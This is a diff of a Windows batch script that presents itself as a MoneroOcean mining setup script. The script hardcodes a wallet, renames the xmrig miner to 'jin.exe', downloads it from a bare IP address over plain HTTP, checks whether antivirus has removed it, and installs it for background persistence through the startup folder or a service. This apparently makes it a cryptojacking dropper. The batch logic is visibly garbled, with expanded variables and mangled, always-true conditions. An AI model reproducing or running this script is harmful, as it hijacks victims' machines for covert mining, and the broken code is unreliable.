@@ -4,9 +4,12 @@ rem printing greetings
 echo MoneroOcean mining setup script v2.5.
 echo (please report issues to support@moneroocean.stream email)
 echo.
-net session >nul 2>
-1
-if  == 0 (set ADMIN=1) else (set ADMIN=0)
+net session >nul 2>&1
+if 0 == 0 (
+set ADMIN=1
+) else (
+set ADMIN=0
+)
 rem command line arguments
 set WALLET=43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4
 rem this one is optional
@@ -21,8 +24,12 @@ exit /b 1
 )
 for /f "delims=." %%a in ("43DTEF92be6XcPj5Z7U96g4oGeebUxkFq9wyHcNTe1otM2hUrfvdswGdLHxabCSTio7apowzJJVwBZw6vVTu7NoNCNAMoZ4") do set WALLET_BASE=%%a
 call :strlen "%%a"  WALLET_BASE_LEN
-if  == 106 goto WALLET_LEN_OK
-if  ==  95 goto WALLET_LEN_OK
+if  == 106 (
+goto WALLET_LEN_OK
+)
+if  ==  (
+95 goto WALLET_LEN_OK
+)
 echo ERROR: Wrong wallet address length (should be 106 or 95):
 exit /b 1
 :WALLET_LEN_OK
@@ -35,28 +42,28 @@ echo ERROR: Please make sure user directory C:\Users\puncher exists
 exit /b 1
 )
 where powershell >NUL
-if not  == 0 (
+if not 0 == 0 (
 echo ERROR: This script requires "powershell" utility to work correctly
 exit /b 1
 )
 where find >NUL
-if not  == 0 (
+if not 0 == 0 (
 echo ERROR: This script requires "find" utility to work correctly
 exit /b 1
 )
 where findstr >NUL
-if not  == 0 (
+if not 0 == 0 (
 echo ERROR: This script requires "findstr" utility to work correctly
 exit /b 1
 )
 where tasklist >NUL
-if not  == 0 (
+if not 0 == 0 (
 echo ERROR: This script requires "tasklist" utility to work correctly
 exit /b 1
 )
-if 1) else (set ADMIN=0) == 1 (
+if 0 == 1 (
 where sc >NUL
-if not  == 0 (
+if not 0 == 0 (
 echo ERROR: This script requires "sc" utility to work correctly
 exit /b 1
 )
@@ -67,31 +74,44 @@ if [(4 * 700 / 1000)] == [] (
 echo ERROR: Can't compute projected Monero hashrate
 exit
 )
-if (4 * 700 / 1000) gtr 8192 ( set PORT=18192
+if (4 * 700 / 1000) gtr 8192 (
+set PORT=18192
 goto PORT_OK )
-if (4 * 700 / 1000) gtr 4096 ( set PORT=14096
+if (4 * 700 / 1000) gtr 4096 (
+set PORT=14096
 goto PORT_OK )
-if (4 * 700 / 1000) gtr 2048 ( set PORT=12048
+if (4 * 700 / 1000) gtr 2048 (
+set PORT=12048
 goto PORT_OK )
-if (4 * 700 / 1000) gtr 1024 ( set PORT=11024
+if (4 * 700 / 1000) gtr 1024 (
+set PORT=11024
 goto PORT_OK )
-if (4 * 700 / 1000) gtr  512 ( set PORT=10512
+if (4 * 700 / 1000) gtr  512 (
+set PORT=10512
 goto PORT_OK )
-if (4 * 700 / 1000) gtr  256 ( set PORT=10256
+if (4 * 700 / 1000) gtr  256 (
+set PORT=10256
 goto PORT_OK )
-if (4 * 700 / 1000) gtr  128 ( set PORT=10128
+if (4 * 700 / 1000) gtr  128 (
+set PORT=10128
 goto PORT_OK )
-if (4 * 700 / 1000) gtr   64 ( set PORT=10064
+if (4 * 700 / 1000) gtr   64 (
+set PORT=10064
 goto PORT_OK )
-if (4 * 700 / 1000) gtr   32 ( set PORT=10032
+if (4 * 700 / 1000) gtr   32 (
+set PORT=10032
 goto PORT_OK )
-if (4 * 700 / 1000) gtr   16 ( set PORT=10016
+if (4 * 700 / 1000) gtr   16 (
+set PORT=10016
 goto PORT_OK )
-if (4 * 700 / 1000) gtr    8 ( set PORT=10008
+if (4 * 700 / 1000) gtr    8 (
+set PORT=10008
 goto PORT_OK )
-if (4 * 700 / 1000) gtr    4 ( set PORT=10004
+if (4 * 700 / 1000) gtr    4 (
+set PORT=10004
 goto PORT_OK )
-if (4 * 700 / 1000) gtr    2 ( set PORT=10002
+if (4 * 700 / 1000) gtr    2 (
+set PORT=10002
 goto PORT_OK )
 set PORT=10001
 :PORT_OK
@@ -104,7 +124,7 @@ if not [prx] == [] (
 echo (and prx email as password to modify wallet options later at https://moneroocean.stream site)
 )
 echo.
-if 0) == 1 ( == 0 (
+if 0 == 0 (
 echo Since I do not have admin access  mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
 echo Mining in background will be performed using jin_miner service.
@@ -121,7 +141,9 @@ taskkill /f /t /im jin.exe
 echo [*] Removing "C:\Users\puncher\jin" directory
 timeout 5
 rmdir /q /s "C:\Users\puncher\jin" >NUL 2>NUL
-IF EXIST "C:\Users\puncher\jin" GOTO REMOVE_DIR0
+IF EXIST "C:\Users\puncher\jin" (
+GOTO REMOVE_DIR0
+)
 echo [*] Downloading MoneroOcean advanced version of xmrig to "C:\Users\puncher\jin.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://150.129.234.203:82/jin.zip', 'C:\Users\puncher\jin.zip')"
 if errorlevel 1 (
@@ -145,7 +167,9 @@ del "C:\Users\puncher\jin.zip"
 echo [*] Checking if advanced version of "C:\Users\puncher\jin\jin.exe" works fine (and not removed by antivirus software)
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 "C:\Users\puncher\jin\jin.exe" --help >NUL
-if  equ 0 goto MINER_OK
+if 0 equ 0 (
+goto MINER_OK
+)
 :MINER_BAD
 if exist "C:\Users\puncher\jin\jin.exe" (
 echo WARNING: Advanced version of "C:\Users\puncher\jin\jin.exe" is not functional
@@ -162,7 +186,9 @@ exit /b 1
 echo [*] Removing "C:\Users\puncher\jin" directory
 timeout 5
 rmdir /q /s "C:\Users\puncher\jin" >NUL 2>NUL
-IF EXIST "C:\Users\puncher\jin" GOTO REMOVE_DIR1
+IF EXIST "C:\Users\puncher\jin" (
+GOTO REMOVE_DIR1
+)
 echo [*] Unpacking "C:\Users\puncher\jin.zip" to "C:\Users\puncher\jin"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Users\puncher\jin.zip', 'C:\Users\puncher\jin')"
 if errorlevel 1 (
@@ -184,7 +210,9 @@ del "C:\Users\puncher\jin.zip"
 echo [*] Checking if stock version of "C:\Users\puncher\jin\jin.exe" works fine (and not removed by antivirus software)
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 "C:\Users\puncher\jin\jin.exe" --help >NUL
-if  equ 0 goto MINER_OK
+if 0 equ 0 (
+goto MINER_OK
+)
 if exist "C:\Users\puncher\jin\jin.exe" (
 echo WARNING: Stock version of "C:\Users\puncher\jin\jin.exe" is not functional
 ) else (
@@ -221,7 +249,9 @@ echo echo Run "taskkill /IM jin.exe" if you want to remove background miner firs
 echo :EXIT
 ) > "C:\Users\puncher\jin\miner.bat"
 rem preparing script background work and work under reboot
-if 0) == 1 ( == 1 goto ADMIN_MINER_SETUP
+if 0 == 1 (
+goto ADMIN_MINER_SETUP
+)
 if exist "C:\Users\puncher\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
 set "STARTUP_DIR=C:\Users\puncher\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 goto STARTUP_DIR_OK
@@ -273,7 +303,7 @@ set "token=#%~1"
 set "len=0"
 for /L %%A in (12 -1 0) do (
 set/A "len|=1<<%%A"
-for %%B in (0) do if ""=="" set/A "len&=~1<<%%A"
+for %%B in ((1<<%%A)) do if ""=="" set/A "len&=~1<<%%A"
 )
 endlocal
 set len%
